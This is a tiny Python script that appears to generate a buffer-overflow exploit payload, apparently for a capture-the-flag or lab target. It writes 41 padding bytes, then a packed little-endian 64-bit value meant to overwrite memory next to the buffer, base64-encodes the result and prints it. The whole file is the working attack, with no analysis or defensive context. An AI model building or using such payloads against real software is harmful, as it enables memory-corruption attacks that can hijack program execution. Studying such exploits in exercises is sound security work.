
import sys
import struct
import base64

buf = b'JJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJ'
buf += struct.pack('<Q', 3570730894546583083)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
